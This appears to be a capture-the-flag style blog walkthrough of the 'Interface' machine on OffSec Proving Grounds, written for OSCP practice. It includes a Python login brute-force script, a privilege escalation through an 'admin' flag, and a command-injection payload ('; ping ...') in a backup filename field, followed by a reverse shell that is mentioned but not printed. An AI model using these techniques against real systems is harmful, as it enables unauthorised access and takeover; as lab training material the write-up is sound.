---
title: Iterface Easy box on OffSec Proving Grounds - OSCP Preparation.
tags: [oscp easy box, PG easy box, enumeration, API, RCE, linux]
categories: [OSCP, Proving Grounds]
comments: true
date: 2022-01-21 09:33:00
---

Hello,

We are going to exploit one of [OffSec Proving Grounds](https://portal.offensive-security.com/proving-grounds/play) Medium machines which called `Interface` and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.

## Enumeration:
- Nmap:
![image](/assets/img/sample/pg-interface/nmap.png)

- port `80` is running a node.js app
- We can get the full list of users from: http://interface.pg/api/users.

- Running `ffuf` on http://interface.pg/api/ gives us some other endpoints:
	* `/backup` , Status code: 401
	* `/settings`, Status code: 401

- bruteforce the login page with this script (you can use hydra or other tools for that!):

```python
#!/usr/bin/env python

from concurrent.futures import ThreadPoolExecutor as executor
import requests,sys


headers = {"Content-Type": "application/json", "Host": "interface.pg"}


def printer(url):
	sys.stdout.write(url+"                                                                       \r")
	sys.stdout.flush()
	return True

#@snoop
def Login(USERNAME, PASSWORD):
	printer("Trying: "+USERNAME+":"+PASSWORD)
	data = {"username":"USERNAME", "password":"PASSWORD"}
	data['username'] = USERNAME
	data['password'] = PASSWORD
	req = requests.post("http://interface.pg/login", json=data, headers=headers)
	if req.status_code != 401:
		print(str(req.status_code)+" | Creds> "+USERNAME+":"+PASSWORD)
		print('\n')
		exit(0)


users = open('users.txt', 'r')
for user in users:
	USERNAME = user.strip('\n')
	passwds = open('/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt', 'r')
	with executor(max_workers=20) as exe:
		[exe.submit(Login, USERNAME, passwd.strip('\n')) for passwd in passwds]

``` 

- We got a valid Credentials:
	* User: `dev-acct`
	* Pass: `password`

![image](/assets/img/sample/pg-interface/creds.png)

- Now we can access `/api/settings` endpoint:
![image](/assets/img/sample/pg-interface/access-settings.png)

- if you take a look at the response from the picture above you will notice that `"admin":false` looks juicy, let's try to get admin access:
![image](/assets/img/sample/pg-interface/admin.png)

- Now since we have admin privilege, we can access `/api/backup` endpoint.

## Command Injection:
- apparently the application takes a filename and create a backup, let's try and exploit that:
> Checking the RCE with this payload: `; ping -c 3 MY_IP_ADDRESS;`

![image](/assets/img/sample/pg-interface/rce.png)

* I got the ping hits on my local machine which confirms the RCE:
![image](/assets/img/sample/pg-interface/ping.png)


- I used a bash reverse shell [payload](https://bing0o.github.io/posts/reverse-shell-generator/) to get a shell as root:

![image](/assets/img/sample/pg-interface/root.png)

Happy Hacking!